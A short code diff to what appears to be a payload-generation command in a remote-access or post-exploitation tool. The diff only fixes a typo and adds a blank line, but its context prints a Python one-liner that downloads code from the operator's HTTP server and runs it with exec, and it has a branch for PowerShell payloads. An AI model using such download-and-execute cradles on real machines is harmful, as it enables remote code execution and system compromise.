@@ -133,7 +133,7 @@ def do(server, handler, config, args):
         return
 
     if not output:
-        handler.display(Wrror('payload generation failed'))
+        handler.display(Error('payload generation failed'))
         return
 
     if server.httpd and output.startswith(wwwroot):
@@ -154,6 +154,7 @@ def do(server, handler, config, args):
                     break
         except:
             pass
+
         if args.format=='py':
             handler.display(Success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath)))
         elif args.format=='ps1':
